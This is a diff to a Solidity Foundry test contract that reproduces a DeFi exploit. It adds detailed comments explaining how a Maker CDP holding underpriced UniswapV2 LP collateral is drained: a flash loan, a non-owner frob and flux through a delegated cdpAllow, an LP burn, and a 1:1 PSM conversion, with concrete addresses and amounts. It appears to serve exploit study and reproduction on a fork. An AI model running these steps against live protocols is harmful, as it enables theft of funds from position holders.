@@ -117,6 +117,32 @@ contract Circle is BaseTestWithBalanceLog {
         uint256 fee,
         bytes calldata data
     ) external returns (bytes32) {
+        // VULNERABILITY: Mispriced UniswapV2 LP Collateral Valuation in Maker UNIV2DAIUSDC-A Ilk (CDP Partial Close Arbitrage)
+        // Root cause: Maker's Vat accounting + ilk-specific oracle for UNIV2DAIUSDC-A (bytes32 ilk = 0x554e495632444149555344432d4100...) valued locked LP collateral (Urn.ink) using a spot price [ray] (see Ilk.spot read at L124) that was lower than the actual economic redemption value of those LP tokens. The LP (UNIV2 token at 0xAE461cA67B15dc8dc81CE7615e0320dA1A9aB8D5) when burned against the real pair reserves (via burn()) redeems pro-rata DAI+USDC at current balances/totalSupply (see UniswapV2Pair.burn in sources/...). Because frob only enforces the (under)priced spot*ink >= art*rate invariant, a partial unwind (reducing art via dart while extracting dink) released collateral whose market value exceeded the debt slice repaid.
+        // Code references:
+        //   - L121: address urns_address = ...urns(28_311); Urn memory urn = IMakerVat(...).urns(ilk, urns_address);  // ink=locked LP, art=normalized debt
+        //   - L123: Ilk memory ilk = ...ilks(ilk);  // contains .spot used for collateralization checks inside Vat.frob
+        //   - L136: IMakerManager(...).frob(28_311, -1_104_761_777_152_681_125 /*-dink= -ink/4*/, -2_419_153_952_397_280_665_329_975 /*-dart=-art/4*/);
+        //   - L139: flux + L140: IUniv2(univ2).exit(...) gets LP ERC20 (GemJoin just does vat.slip + transfer)
+        //   - L142: IERC20(univ2_token).transfer(...) ; IUniv2Token(univ2_token).burn(...)  --> receives amount0/amount1 > accounted value
+        //   - L145: Mcd(mcd).sellGem(...) which is DssPsm.sellGem (tin=0) using AuthGemJoin5 to convert USDC->DAI 1:1
+        //   - The flash lender (L109) and PSM provide zero-cost roundtrip for the DAI leg.
+        // Why it works: (1) cdpAllow pre-granted to 0xfd515...047d9 lets attacker call frob/flux without being owner (L133 prank). (2) 0-fee DSS flash supplies the DAI to join for the dart reduction. (3) LP burn value delta is captured as USDC because PSM is 1:1 and no slippage in this tx. (4) No sanity check in frob path or GemJoin or LP adapter that redemption value >= system valuation.
+        // Impact: ~$50.5k USDC extracted from the CDP position (attacker ends with profit after flash repay). The position's embedded surplus value (difference between burn redemption and oracle-backed debt capacity) is drained. Any holder of such a CDP with cdpAllow to a prepared attacker contract, or the owner themselves, could repeat. Affects all UNIV2 LP ilks with similar pricing gaps vs. on-chain redemption.
+        //
+        // EXPLOIT STEPS:
+        // 1. (pre-tx) The attacker address 0xdfdea2... grants cdpAllow(CDP=28311, 0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9, 1) on DssCdpManager so that address can frob/flux.
+        // 2. testExploit() calls IMakerPool(maker).flashLoan(this, DAI, 2_437_926_935_218_598_618_037_988, data) -- 0-fee ERC3156 flash from Maker DSS.
+        // 3. onFlashLoan: resolve urn = manager.urns(28311); read current Urn{ink,art} and Ilk{spot,...} from Vat (purely informational here).
+        // 4. balance DAI, approve DaiJoin, DaiJoin.join(urn, amount) -- burns ERC20 DAI and moves internal DAI into the urn so that dart reduction won't underflow Vat dai balance.
+        // 5. prank as authorized 0xfd51... ; manager.frob(cdp, -dink, -dart) -- this calls into Vat.frob which (a) decreases ink, (b) decreases art, (c) moves the dart DAI from urn to cover the debt burn. Because spot was low, the post-frob position still satisfies the collateralization check.
+        // 6. prank again; manager.flux(cdp, this, dink) -- moves the freed gem (LP) from urn's locked collateral into the caller's gem balance inside Vat.
+        // 7. GemJoin.exit(this, dink) -- vat.slip(ilk, msg.sender, -dink); gem.transfer(this, dink) -- now attacker holds the actual ERC20 LP.
+        // 8. LP.transfer(pair, dink); pair.burn(this) -- executes the standard pro-rata redemption using current reserves (see UniswapV2Pair.burn L429-449), receiving real DAI + USDC whose sum > value of dart repaid.
+        // 9. USDC.approve(AuthGemJoin, max); PSM.sellGem(this, 1193139061611) -- AuthGemJoin5.join (scales 6->18), Vat.frob on USDC PSM ilk (mints DAI), DaiJoin.exit (receives DAI). tin=0 so no fee.
+        // 10. DAI.approve(flash, max); return magic bytes32 -- flash lender pulls back principal (covered exactly by DAI from burn + PSM). Leftover USDC = profit.
+        // 11. (end) Attacker's Circle/USDC balance increased by the delta.
+
         address urns_address = IMakerManager(maker_cdp_manager).urns(28_311);
         Urn memory urn = IMakerVat(make_mcd_vat).urns(
             0x554e495632444149555344432d41000000000000000000000000000000000000, urns_address
@@ -130,19 +156,19 @@ contract Circle is BaseTestWithBalanceLog {
 
         IMakerManager(maker_mcd_join_dai).join(urns_address, amount_dai);
 
-        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)
+        cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9); // borrow the authority of cdp 28311 (assigned before)  // VULN: cdpAllow is the access vector enabling non-owner frob
         // dink = 0-urn.ink/4 = -1104761777152681125
         // dart = 0-urn.art/4 = -2419153952397280665329975
-        IMakerManager(maker_cdp_manager).frob(28_311, -1_104_761_777_152_681_125, -2_419_153_952_397_280_665_329_975);
+        IMakerManager(maker_cdp_manager).frob(28_311, -1_104_761_777_152_681_125, -2_419_153_952_397_280_665_329_975);  // VULN: frob with negative dink/dart on underpriced LP collateral extracts surplus
         cheats.prank(0xfd51531b26f9Be08240f7459Eea5BE80D5B047D9);
         IMakerManager(maker_cdp_manager).flux(28_311, address(this), 1_104_761_777_152_681_125);
         IUniv2(univ2).exit(address(this), 1_104_761_777_152_681_125);
 
         IERC20(univ2_token).transfer(univ2_token, 1_104_761_777_152_681_125);
-        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));
+        (uint256 amount0, uint256 amount1) = IUniv2Token(univ2_token).burn(address(this));  // VULN: burn redeems at TRUE reserve value >> Maker's spot-priced valuation
 
         IERC20(circle).approve(allower, type(uint256).max);
-        Mcd(mcd).sellGem(address(this), 1_193_139_061_611);
+        Mcd(mcd).sellGem(address(this), 1_193_139_061_611);  // VULN: 1:1 PSM conversion (tin=0) lets attacker convert USDC leg back to DAI costlessly
         IERC20(dai).approve(maker, type(uint256).max);
         return 0x439148f0bbc682ca079e46d6e2c2f0c1e3b820f1a291b069d8882abf8cf18dd9;
     }
